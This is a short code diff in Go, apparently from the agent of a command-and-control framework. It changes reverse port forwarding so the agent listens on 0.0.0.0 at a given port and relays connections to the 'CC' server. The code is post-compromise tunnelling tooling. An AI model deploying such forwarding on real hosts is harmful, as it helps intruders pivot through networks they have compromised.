@@ -122,6 +122,7 @@ func TCPFwd(addr, port string, ctx context.Context, cancel context.CancelFunc) (
 }
 
 // PortFwd port mapping, receive request data then send it to target port on remote address
+// addr: when reversed, addr should be port
 func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	var (
 		session PortFwdSession
@@ -140,7 +141,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	// connect via h2 to CC, or not
 	ctx, cancel = context.WithCancel(context.Background())
 	if reverse {
-		go listenAndFwd(ctx, cancel, addr, sessionID)
+		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
 		conn, ctx, cancel, err = ConnectCC(url)
 		log.Printf("PortFwd started: %s (%s)", addr, sessionID)
@@ -172,16 +173,17 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 
 // start a local listener on agent, forward connections to CC
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
-	from, sessionID string) {
+	port, sessionID string) {
 	var (
 		url = CCAddress + tun.ProxyAPI
 		err error
 	)
 
 	// listen
-	l, err := net.Listen("tcp", from)
+	addr := "0.0.0.0:" + port
+	l, err := net.Listen("tcp", addr)
 	if err != nil {
-		log.Printf("listen on %s failed: %s", from, err)
+		log.Printf("listen on %s failed: %s", addr, err)
 	}
 	defer cancel()
 
